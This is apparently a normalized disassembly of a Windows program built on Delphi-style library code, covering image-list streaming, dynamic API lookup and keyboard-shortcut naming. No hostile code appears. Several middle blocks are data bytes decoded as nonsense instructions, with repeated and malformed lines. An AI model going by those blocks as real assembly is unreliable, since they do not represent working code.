sub_44508c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_444778
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_444f9c
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_4450e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_419558
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_44508c
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_445140
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_4156ac
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_4156ac
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f8b4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_415480
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_4154a0
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f8b4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f8b4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f8b4
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_420bec
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_41240c
mov eax [ ebp - 0x4 ]
call sub_44576c
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445391
mov eax [ ebp - 0xc ]
call sub_403234
mov eax [ ebp - 0x14 ]
call sub_403234
mov eax [ ebp - 0x4 ]
call sub_445770
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_412434
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_41fe7c
push eax
mov eax [ ebp - 0xc ]
call sub_41fe7c
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41cc74
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_412434
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_41fe7c
push eax
mov eax [ ebp - 0x14 ]
call sub_41fe7c
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41cc74
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4446ac
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_4453d4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_419cec
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_444544
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44543b
mov eax [ ebp - 0xc ]
call sub_403234
retn
sub eax 0xffffffec
sub_44543b
mov eax [ ebp - 0x4 ]
call sub_444434
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4154a0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_415ba8
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_4154a0
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403234
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_4154a0
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_419cec
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_4154a0
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_444544
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403234
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_4154a0
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_44559c
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_4445d4
mov eax edi
call sub_415480
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_4154a0
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_445140
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_4453d4
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_445628
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_419cec
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40baf0
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_444570
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_444570
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445729
mov eax [ ebp - 0x4 ]
call sub_403234
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b35c
call sub_4039a8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b35c
call sub_4039a8
jmp r-xdata
sub_445790
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
mov edx esi
call sub_444f00
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_4457dc
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445808
retn
sub_445818
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
pop eax
inc esp
add [ eax + eax ] cl
add [ eax ] al
int3
sub_445c5e
cmp [ edi - 0x6ec7ffbc ] dl
inc esp
add [ eax ] cl
xchg edx eax
inc esp
add [ eax - 0x6e ] al
inc esp
add [ eax - 0x6bffbb6a ] ch
xchg esi eax
inc esp
add [ edi + ecx * 4 + 0x54090044 ] dl
dec ebp
outsb
jne r-xdata
test al 0x0
add bh bh
test al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
push es
add [ esi ] al
inc edx
inc ebx
push 0x586b6365
pop edx
inc esp
add [ ebx ] bh
add [ eax ] al
dec eax
mov eax [ 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x2 ] al
arpl [ ebx + 0x58 ] bp
insd
mov [ esp + eax * 2 ] bl
pop es
or [ ebp + ecx * 2 + 0x65 ] edx
outsb
jne r-xdata
inc edx
jb r-xdata
dec eax
outsd
je r-xdata
add eax [ eax ]
or [ ecx + 0x75 ] eax
je r-xdata
add [ eax ] 0x0
add [ eax ] al
je r-xdata
outsb
jne r-xdata
imul edx [ eax + edx + 0x300040 ] 0x0
[ eax + 0x7c00448f ]
popad
jns r-xdata
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
insd
in al dx
pop ebx
inc esp
add [ eax ] cl
and al [ ecx ]
sbb [ eax ] al
add eax 0x756e654d
jae r-xdata
push esp
adc [ eax ] al
aas
add [ eax ] al
jmp esp
insd
popad
jae r-xdata
add bh bh
test al 0x8f
inc esp
add [ eax + ebx * 4 + 0x44 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070008 ] al
popad
jo r-xdata
pop eax
pop edx
inc esp
add [ eax + eax ] bh
add bh bh
inc esp
mov [ 0x10044 ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x2 ] al
add eax 0x75411100
je r-xdata
add [ eax ] al
add [ edx ] 0x0
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x28004123 ] bl
xchg ecx eax
inc esp
add ah al
xchg ebp eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41060002 ] al
adc [ eax ] al
cmp al [ eax ]
add bh bh
pushad
xchg edx eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
inc esp
popa
jne r-xdata
add [ eax ] al
[ eax + edx * 4 + 0x44 ]
imul ebp [ edi + 0x6e ] r-xdata
cmp [ eax ] al
add bh bh
sbb [ eax - 0x6763ffbc ] dl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
pop es
inc ebx
push 0x656b6365
pop eax
inc edx
inc esp
add [ eax + eax ] bh
[ eax - 0x66 ]
outsb
add [ eax ] dl
inc eax
add [ eax ] bh
add [ eax ] al
[ eax ]
nop
inc esp
add [ eax + ebx * 4 + 0x44 ] bl
add [ eax ] al
imul esi [ ebp + ebp * 2 + 0x61 ] 0x44586c70
add [ eax ] cl
add bh bh
cwde
pop [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ 0x61657242 ] al
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push eax
mov bl 0x41
add [ ebp + edx * 4 - 0x69cbffbc ] bl
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42060006 ] al
js r-xdata
je r-xdata
cmp al 0x99
xchg esp eax
adc [ eax ] al
pop eax
add [ eax ] al
[ eax ]
add bh bh
fcomp [ eax + 0x44 ]
add [ eax - 0x80000000 ] al
sldt [ eax + ecx * 2 ]
imul ebp [ esi + 0x74 ] r-xdata
inc eax
add [ eax ] al
[ eax + 0x1c004491 ]
cdq
inc esp
add [ eax ] al
add [ eax ] al
cmp bh 0xff
adc [ eax ] al
cmp [ eax ] eax
add bh bh
insb
nop
inc esp
add [ eax + ebx * 4 + 0x44 ] bh
add [ eax + 0x1 ] al
or al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
cwde
inc ebx
jne r-xdata
inc ecx
add [ ecx + ebx * 4 + 0x41 ] ah
add [ eax + 0x34 ] dh
inc eax
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
dec [ eax + 0x5c004491 ]
cdq
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x54656c62
cmovno eax [ eax ]
mov [ eax ] al
add bh bh
mov [ eax ] al
add bh bh
jl r-xdata
add [ edx + edx * 4 + 0x34780041 ] ah
inc eax
xor al 0x40
ja r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x61 ] edx
imul ebp [ fs : edi + 0x49 ] 0x3c6d6574
cmovno eax [ eax ]
pushad
add [ eax ] al
push [ ecx + edx * 4 + 0x44 ]
add [ ecx + ebx * 4 ] bh
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070014 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb r-xdata
add [ esi + 0x60 ] bl
inc esp
add [ edx + 0x60 ] dh
inc esp
add [ eax ] bl
add [ eax ] al
or al 0x21
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x4844a03e
movsb [ edi ] [ esi ]
inc esp
add al cl
inc ecx
add [ eax - 0x6b ] bl
inc ecx
add ah ah
cmp eax 0xac700041
inc esp
add [ ebp * 4 - 0x69bfffbc ] cl
xor al 0x40
insd
call 0xffffffffa044a3f7
add [ eax ] al
jmp [ eax + 0x1ff0000 ]
add [ 0x654d6e4f ] cl
popad
jae r-xdata
je r-xdata
inc ecx
add [ eax - 0x6a ] cl
inc ecx
add [ ecx + ebx * 4 - 0x5c53ffbf ] al
inc esp
add [ eax - 0x54 ] bl
inc esp
add [ esp - 0x5377ffbc ] bl
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] dl
add [ eax ] al
add eax [ eax ]
std
push eax
xchg esi eax
jb r-xdata
dec esp
pushad
inc esp
insd
jo r-xdata
inc ecx
add [ eax ] bh
xchg edi eax
inc ecx
add [ ecx + ebx * 4 + 0x41 ] bh
add [ eax - 0x6a ] dl
inc esp
add [ eax - 0x6a ] al
dec ecx
je r-xdata
add [ eax + 0x44 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x44 ] cl
add [ eax ] al
inc esp
add [ eax - 0x67010000 ] bl
xchg esi eax
insd
lea eax [ eax ]
adc [ eax + 0x44 ] ah
sub_445dcb
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x530d000a ] al
jne r-xdata
add [ eax ] al
add [ eax ] al
dec ebp
outsb
jne r-xdata
adc [ eax ] al
cmp eax 0xcff0000
xchg edi eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
dec ecx
outsb
js r-xdata
push esp
adc [ eax ] al
aas
add [ eax ] al
jmp esp
insd
popad
jae r-xdata
cwde
inc ebx
jne r-xdata
or eax 0x72470a00
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
push cs
inc ecx
add [ eax + eax ] dl
call [ eax + eax ]
adc [ eax ] al
cmp al [ eax ]
add bh bh
pushad
xchg edx eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
inc esp
popa
jne r-xdata
inc ecx
add [ ecx + ebx * 4 + 0x41 ] ah
add [ eax + 0x34 ] dh
inc eax
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
dec [ eax + 0x5c004491 ]
cdq
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x54656c62
cmovno eax [ eax ]
mov [ eax ] al
add bh bh
mov [ eax ] al
add bh bh
jl r-xdata
js r-xdata
je r-xdata
add [ edx + edx * 4 + 0x34780041 ] ah
inc eax
xor al 0x40
ja r-xdata
adc [ eax ] eax
or [ edx + 0x61 ] edx
imul ebp [ fs : edi + 0x49 ] 0x3c6d6574
cmovno eax [ eax ]
pushad
add [ eax ] al
push [ ecx + edx * 4 + 0x44 ]
add [ ecx + ebx * 4 ] bh
add [ eax ] al
add [ eax ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070014 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
cmp al 0x99
xchg esp eax
adc [ eax ] al
pop eax
add [ eax ] al
[ eax ]
add bh bh
fcomp [ eax + 0x44 ]
add [ eax - 0x80000000 ] al
sldt [ eax + ecx * 2 ]
imul ebp [ esi + 0x74 ] r-xdata
inc eax
add [ eax ] al
[ eax + 0x1c004491 ]
cdq
inc esp
add [ eax ] al
add [ eax ] al
cmp bh 0xff
adc [ eax ] al
cmp [ eax ] eax
add bh bh
insb
nop
inc esp
add [ eax + ebx * 4 + 0x44 ] bh
add [ eax + 0x1 ] al
or al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ esi + 0x60 ] bl
inc esp
add [ edx + 0x60 ] dh
inc esp
add [ eax ] bl
add [ eax ] al
or al 0x21
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x4844a03e
movsb [ edi ] [ esi ]
inc esp
add al cl
inc ecx
add [ eax - 0x6b ] bl
inc ecx
add ah ah
cmp eax 0xac700041
inc esp
add [ ebp * 4 - 0x69bfffbc ] cl
xor al 0x40
insd
call 0xffffffffa044a3f7
add [ eax ] al
jmp [ eax + 0x1ff0000 ]
add [ 0x654d6e4f ] cl
popad
jae r-xdata
je r-xdata
inc ecx
add [ eax - 0x6a ] cl
inc ecx
add [ ecx + ebx * 4 - 0x5c53ffbf ] al
inc esp
add [ eax - 0x54 ] bl
inc esp
add [ esp - 0x5377ffbc ] bl
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] dl
add [ eax ] al
add eax [ eax ]
std
push eax
xchg esi eax
jb r-xdata
dec esp
pushad
inc esp
insd
jo r-xdata
inc ecx
add [ eax ] bh
xchg edi eax
inc ecx
add [ ecx + ebx * 4 + 0x41 ] bh
add [ eax - 0x6a ] dl
inc esp
add [ eax - 0x6a ] al
dec ecx
je r-xdata
add [ eax + 0x44 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x44 ] cl
add [ eax ] al
inc esp
add [ eax - 0x67010000 ] bl
xchg esi eax
insd
lea eax [ eax ]
adc [ eax + 0x44 ] ah
sub_446744
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_435bd0
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43b42c
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_44679c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_4467d4
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_403f6c
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_4041dc
sub_446828
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404004
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_404154
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404004
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_404004
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_404154
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_404154
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_403f6c
mov eax esi
call sub_403f6c
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_404004
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_407d14
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404278
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_4467d4
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404234
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404004
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404234
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_404234
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404234
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446a18
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403f90
retn
sub_446a2c
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_40422c
push eax
mov eax edi
call sub_40422c
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40422c
push eax
mov eax edi
call sub_40442c
push eax
